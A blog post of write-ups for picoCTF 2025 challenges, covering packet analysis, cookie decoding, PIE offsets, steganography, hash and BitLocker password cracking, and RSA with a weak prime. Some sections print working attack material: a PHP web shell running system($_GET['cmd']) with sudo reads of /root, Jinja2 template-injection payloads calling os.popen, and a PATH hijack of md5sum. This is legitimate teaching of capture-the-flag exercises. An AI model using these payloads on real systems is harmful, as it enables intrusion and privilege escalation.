---
title: "PICO CTF 2025"
date: 2025-04-07T14:18:49+01:00
draft: false
---
# Fantasy CTF

Connect via:

```nc verbal-sleep.picoctf.net 55716```

Then press enter 5 times and read the dialogue if you wish for a future based dialogue.


Input ```b``` and hit enter 9 times.

Input ```a``` to play the game and hit enter 5 times to find the flag

# Ph4nt0m 1ntrud3r

Open the packet capture provided with Wireshark.

The PDU data has been segmented into multiple TCP segments so if we follow the byte stream of the TCP segments we see a B64 encoded message: “bnRfdGg0dA==”.

You can then decode this using a tool like Cyber Chef to then find that it looks oddly like a flag.

If we take the hint and sort out the packets by time, you will see that the message starts at packet 20.

We can also infer that it's B64 encoded as every TCP payload following this packet contains “==”. By decoding each packet’s payload up until packet 7 we can get the flag.

# Cookie Monster Secret Recipe

We can visit the website provided in the description and then open your browser's developer tools before attempting to log in. 

In dev tools, go to the "application" tab and view your provided cookie. It should contain a ```secret_recipe``` value that you can then decode using Cyberchef, first use URL decoding and then Base64 decode.

You can tell it is URL encoded by its use of "%" signs to encode special characters. 

# Head-dump

Visit the site instance provided in the challenge description. Then, on the site, click on the Documentation link on a post by "John Doe", as you can see there is an endpoint at /heapdump that can be accessed through the browser.

Download the heap dump file and then use a tool like [https://jsoneditoronline.org](https://jsoneditoronline.org/) and search for “pico” to find the flag.

# Flag Hunters

Once we connect to the program we can see it loops over and over showing user input.  
  
Let’s analyse the python code using an IDE (I used VScode), on analysis (attach github repo with source code) we can see that the ```lip``` variable keeps track of the current line from the beginning (including secret section).

You may also notice that when we reach the return line on the first verse or chorus that is repeated, it returns to whatever number follows the return address. 

This program now looks less like a song parser and more like an interpreter of a new programming language that includes flow control via jumps in the lines.

It does this using regular expressions to recognise strings that have the pattern “RETURN \[0-9\]+” but since there is no constraint on which line this string has to occurm, this control flow keyword can occur on any line.

The only condition is that it has to occur at the beginning of a line or following a “;” (since ```for line in song\_lines\[lip\].split(‘;’):``` splits by semi colons). 

The program uses our input to change the following line in the hook: “CROWD” with "Crowd: \<user input\>". 

If we set the user input to `;RETURN 0` it will split the line on the semicolon and the RETURN will jump to to line 0, which is where the secret text block starts. We then find out flag by resuming running through the program.

This is using `;RETURN <line number>` will jump to the line we specify.

# PIE TIME

Firstly the name gives us a big clue, being that PIE stands for "Position Independent Execution" - meaning the code can be loaded and run from any position in memory.

If we download both the source file and the server’s compiled binary we can learn some things:

Firstly, by running `checksec –file=vuln`, we can see that PIE is enabled and so the code can be loaded into and run from any address in memory. You can see this feature in practice by repeatedly running the file and seeing the `main` address (printed by the program) change.

Looking at the source code, we can see that we need to jump to the address of the `win` function to get the flag. To do this, we need to find the offset between the `main` address and `win` address so that we can jump to the right place.

Let's start by compiling the source code with debugging flags. Now if we run the binary using the gdb debugger, we can find the addresses of both `main` and `win` **at runtime** and thus we can figure out the offset.

Let's try run the program and set a breakpoint at a point before the user input. This is to find both the addresses of main and win after they have been loaded into memory.

We can run `print(&main)` in the gdb debugger and confirm that the output points to the right address and print(&win) giving us the address of `win`. We can now continue the program and enter the address of `win` to correctly jump to `win` locally (on your machine).

If we try input this same `win` address the next time we run the program we will get a seg fault **because the addresses are randomised on each run** due to PIE being enabled however the **offsets will always remain the same**! The reason being is so that the code can correctly locate each section on each run.

If we use the offset between the `main` address and `win` address and subtract that from the main address outputted (since `main` appears after `win` in the source file so we have to go backwards back to `win`), we can correctly find the `win` address on each run.

Let’s try this on the remote server Oh no it doesn’t work. Why? Because the server is a different environment to your laptop and the binary you had compiled on your own machine places functions at different offsets to each other when compared to the binary compiled by the server.

How can we work out the server’s offset? Well, Instead of finding the offset in your binary, let's find the offset in the binary file provided by the challenge.

This is because this binary contains the offsets of the binary used by the server. Again, use gdb and since this will load the program into memory, and do `print(&main)` and `print(&win)`. This provides us with the correct addresses which we can subtract to work out the correct offset.

We then subtract this offset from the value of main’s address that the server displays and we get the flag!

# RED

This one was pretty cool! So we are given an image called “red.png” as well as a description saying “RED, RED, RED, RED”.

First things first, as an impulse, when I see an image I run exiftool on it to search for any distict metadata. Luckily, we find a field in the metadata called “Poem” which goes as:

“Crimson heart, vibrant and bold,.Hearts flutter at your sight..Evenings glow softly red,.Cherries burst with sweet life..Kisses linger with your warmth..Love deep as merlot..Scarlet leaves falling softly,.Bold in every stroke.”  
  
I was puzzled by this for a while but then I noticed that if we take the capital letters of each sentence, we get “CHECKLSB” or check the least significant bit.

Great, I have the perfect tool for this: **zsteg** and if we run `zsteg -a red.png` you will notice that the `b1,rgba,lsb,x` that checks the least significant bit on the rgba channels has a familiarish output. Seeing that it has the “==” symbols at the end, we can tell that it's probably a base-64 encoded string.

Plug it into cyberchef and decode from base-64 and we have the flag!

# Rust fixme 1

There are three simple errors in the Rust file:

1) We end lines with “;”,

2) We can return using “return;”

3). {} is used to enter variables into strings

Now run the rust file (`cargo build` then `cargo run`) and you should have the flag.

# Rust fixme 2

There are another 3 simple errors:

1). Changeable parameters must be passed by a mutable reference and have their type set as `&mut` (mutable reference)

2). Mutable variables must be declared as mutable

3). The parameter passed in must be of type `&mut`

# Rust fixme 3

Here we can read the documents and check rust documentation on how to notify the compiler to allow an unsafe operation.

This is done by using the keyword `unsafe` and wrapping the unsafe function around curly braces as done here: {{< highlight rust >}} let decrypted_slice = unsafe {std::slice::from_raw_parts(decrypted_ptr, decrypted_len)};{{< /highlight >}} 

# Hashcrack

First use **netcat** to connect to the remote server which will provide you with a hashed password.

We can then easily identify the hash considering the hash is 32 hex characters long (MD5 hashes are 128-bit). 128/32=4 and we know that each hex character represents 4 bits so it is probably an MD5 hash.  
  
We can then use the **John The Ripper** tool to crack the hash using the command `John --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 <filename>`. The cracked password turns out to be: “password123”

Next we get a hash that looks to be SHA-1 considering SHA-1 is 160-bits which is equivalent to 40 hex characters and the hash is 40 characters long.

Using **John The Ripper** again, `John --wordlist=/usr/share/wordlists/rockyou.txt –format=sha-1 <filename>`. The cracked password turns out to be: “letmein”.  

The next hash we get is 64 hex characters long or a 256 (64*4) bit hash which is indicative of SHA-256. Using **John The Ripper** again with the command `John --wordlist=/usr/share/wordlists/rockyou.txt –format=sha-256 <filename>`, the password is cracked to: “qwerty098”. 

Once we input this, we finally get the flag.

# flags are stepic

I’m ashamed to admit how long this took me. I was quick to find the only flag that did not represent a country, which was Upanzi Republic but from there I was lost. I then tried looking at the source HTML file for any clues and also the downloaded the png image.

Due to my own negligence, I completely ignored the title and tried using stenography tools like **binwalk** and **zsteg** to find the hidden data.

Finally after looking back on the title, I realised I should probably use the **stepic** tool with the command `stepic -d -i <image\_file>\` which produced the flag.

# N0s4n1ty 1

This challenge gives you the ability to upload files to a webserver. First I uploaded a normal png image which worked and I was then able to view it by visiting “/uploads/<filename>.png”. 

I then tried uploading different file formats (including php), as one does, and saw that there was no file sanitisation.

Now I had to check if the server would interpret and run my PHP file so I put together a PHP file with the following sbody: `<?php echo "Hello, World!"; ?>\` and luckily the server ran the code displaying "Hello, World!" on the upload path for that filename. Great!

Now I went straight to over complicating it and crafting a php reverse shell file using **msfvenom** and **meterpreter** however I couldn’t get the listener to catch the connection initiation so I decided to use a more simple approach.

Going back to the basics, I wrote a quick small php script: 
{{< highlight php >}}
<?php

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

?>
{{< /highlight >}}

This checks if the `cmd` parameter is passed in the URL, done by entering `?cmd=` after entering the file path into the URL. If a command is passed via the URL, the server’s OS is used to execute the command passed into the `cmd` paramter.

We can then pass `?cmd=sudo -l` which shows that the user, called “www—data”, has full sudo privileges without a password allowing me to access the `/root` directory and retrieve the flag by running the command `?cmd=sudo cat /root/flag.txt` which then prints the flag.  
  

# hash-only-1

We are given a host to SSH to and the password to authenticate the SSH connection. Upon establishing an authorised, secure connection, we can run `ls` to find a file called `flaghasher`. If we run `file flaghasher` we can see that it is a binary.

Let’s run the binary. It returns the MD5 hash of the flag and shows us the location of the flag. Perhaps we can simply navigate and `cat` the flag file. Unfortunately, we don’t have permissions.

Instead, let’s try something a little more complex. After some thought, I realised the `flaghasher` binary might be calling the `md5sum` command to compute the hash of the file.

Let’s create a script that changes what this command does:

`#!/bin/sh cat "$1"`

This script simply runs `cat` on the first argument.

Now we need to create the script, but we don’t have vim or nano. However there is a tool  we can always rely on: `echo`. Let's run run the commands: `echo '#!/bin/sh' > /tmp/md5sum` and `echo '#!/bin/sh' > md5sum`.

Now that we have our script created, let’s make it executable with `chmod +x md5sum`. Finally, we can prepend it to the beginning of our `PATH` environment variable by doing: `export PATH=.:$PATH`. 

Now if we run `flaghasher` it will call `md5sum` and since it doesn’t specify the full path, the system uses the first `md5sum` in its `PATH` variable which is our script.

This then provides the flag.

This is called a PATH manipulation attack.

# SSTI1

This provides us with a website to visit that renders a new page with whatever input you type in.

Considering the name is “SSTI” we will try Server Side Template Injection. First we can run `{{ 7 \* 7 }}` to see if the SST injection works, it does and we get a page displaying the result - 49.

We can now pass in the following payload (assuming the templates are in Jinja2):

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}`

  
`self` refers to the current template Jinja2 object, `__init__` allows us to access the object’s initialization context (including global variables), `__globals__` is a dictionary containing the global variables used to access Python’s built-in functions, `__builtins__` is a module that contains Python’s built in functions and this allows us to run the built-in function `__import__` to import the `os` module to interact with the operating system.

`popen` is a method in the `os` module that opens a pipe from a shell command which we can then read.

This then returns a page of files in the current working directory of the host which contains: 

`__pycache__ app.py flag requirements.txt`

We can then run the following payload:

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`

to return the contents of the flag file.

# Tap into Hash

This CTF actually taught me how the block chain works.

This one was quite fun apart from me debugging for 30 minutes to then realize that the key in the file is the key pre-hashing and I needed to hash it first.

Nevertheless, you are provided with a source file running through a block chain algorithm that prints a key as well as the encrypted blockchain hash.

There is another file containing a key and encrypted blockchain hash we must decrypt.

Running through the source file, the important functions are: `encrypt`, `pad` and `xor_bytes`.

If we walk through the encrypt process to understand how we must decrypt, we can see that we first need to decrypt the encrypted blockchain.

So let's hash the key from the flag file provided and using a similar process to encryption, we XOR it with every 16 byte block in the encrypted data (this is because XOR is **involutive** and applying it twice simply undoes its operation).

We can now try to decode and print the decrypted hash but this fails as we have not accounted for the added padding.

So we need to remove the padding, luckily the padding uses the length of the padding as the value to pad with. So if we take the last byte (sure to be padding) and remove that many bytes from the end of the decrypted hash, the padding is removed and we can decode and print the hash. 

The flag can be found in the middle of the hash.

# EVEN RSA CAN BE BROKEN???

For this challenge, we can use the hints to see that the prime numbers generated aren’t truly random.

Looking at the "encrypt.py" source code we can see both the public and private key generation process. `p` and `q` are obtained by a mysterious `get\_primes` function where both are half of the length of the key in size. 

The private key is then generated using the modular inverse of e modulo (p-1)*(q-1) – known as **Euler’s totient function**.

The plaintext is then encrypted by modularly raising m to the power of e modulus N.

The plaintext in this case is the flag.

If we run connect to the server multiple times, using its outputs, we can see that N isn’t truly random and shares a GCD of 2 between all Ns. 

This suggests either `p` or `q` is always set to 2. Knowing this we can create a python script that uses the N, the ciphertext, sets `p` as 2 and `q` as N//p. We can then generate the private key using the same process in the "encrypt.py" file where e = 65537 and decrypt the text by raising it to the modular power of d modulo N.

Then we can convert the decrypted message from a long integer to bytes and then decode it into a string we can print.

# Bitlocker-1

The challenge mentions a user “Jacky” using a simple password to encrypt their bitlocker drive, for which we can install the image of using the link.

This provides us with a `.dd` file or disk image file (a byte-for-byte copy of the storage device)

It is quite clear we will need to decrypt this bitlocker disk image and a great tool to use would be **John The Ripper**.

We can then use the subtool `bitlocker2john <file path to disk image>` which produces the output:  

{{< highlight "plaintext" >}}
Encrypted device bitlocker-1.dd opened, size 100MB

Signature found at 0x3

Version: 8

Invalid version, looking for a signature with 
valid version...

Signature found at 0x2195000

Version: 2 (Windows 7 or later)

VMK entry found at 0x21950c5

VMK encrypted with Recovery Password found at 0x21950e6

Salt: 2b71884a0ef66f0b9de049a82a39d15b

Searching AES-CCM from 0x2195102

Trying offset 0x2195195....

VMK encrypted with AES-CCM!!

RP Nonce: 00be8a46ead6da0106000000

RP MAC: a28f1a60db3e3fe4049a821c3aea5e4b

RP VMK: a1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048
b2ef2c9702e298e4c20743126ec8bd29bc6d58

VMK entry found at 0x2195241

VMK encrypted with User Password found at 2195262

VMK encrypted with AES-CCM

UP Nonce: d04d9c58eed6da010a000000

UP MAC: 68156e51e53f0a01c076a32ba2b2999a

UP VMK: fffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b
7b5559d71ba31b6779c6f41412fd6869442d66d

Signature found at 0x2c1d000

Version: 2 (Windows 7 or later)

VMK entry found at 0x2c1d0c5

VMK entry found at 0x2c1d241

Signature found at 0x373a000

Version: 2 (Windows 7 or later)

VMK entry found at 0x373a0c5

VMK entry found at 0x373a241

User Password hash:

$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$1
2$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2
999afffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559
d71ba31b6779c6f41412fd6869442d66d

Hash type: User Password with MAC verification 
(slower solution, no false positives)

$bitlocker$1$16$cb4809fe9628471a411f8380e0f668db$1048576$
12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2
b2999afffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b
5559d71ba31b6779c6f41412fd6869442d66d

Hash type: Recovery Password fast attack

$bitlocker$2$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$
12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3a
ea5e4ba1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048b2
ef2c9702e298e4c260743126ec8bd29bc6d58

Hash type: Recovery Password with MAC verification 
(slower solution, no false positives)

$bitlocker$3$16$2b71884a0ef66f0b9de049a82a39d15b$1048576
$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c
3aea5e4ba1957baea68cd29488c0f3f6efcd4689e43f8ba3120a3304
8b2ef2c9702e298e4c260743126ec8bd29bc6d58
{{< /highlight >}}

&nbsp;

We know that the user’s password is what we want to crack so we can simply copy and paste it into a text file:



{{< highlight "plaintext" >}}
$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$12
$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b299
9afffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d7
1ba31b6779c6f41412fd6869442d66d
{{< /highlight >}}

&nbsp;

Then you can use the command `./john --format=bitlocker –wordlist=<path to wordlist> bitlocker.txt` to crack the bitlocker password using the wordlist of your choice. After a little while, the password is cracked as: “jacqueline”

Now we need to decrypt and mount the drive, lets create a mount point using `sudo mkdir -p /mnt/bitlocker`.

I then used the **dislocker** tool to mount the bitlocker and decrypt the bitlocker drive `sudo dislocker -V bitlocker-1.dd -ujacqueline -- /mnt/bitlocker`, this will unlock the bitlocker volume using jacqueline as the password and mount it on /mnt/bitlocker.

Now we can mount the file as if it were a disk using the command `sudo mount -o loop,ro /mnt/bitlocker/dislocker-file /mnt/bitlocker` this will mount it as if it were a physical read-only disk allowing access in the bitlocker mountpoint.

We can then run `cd /mnt/bitlocker` to find the flag.txt file that we can then `cat` to find the flag.
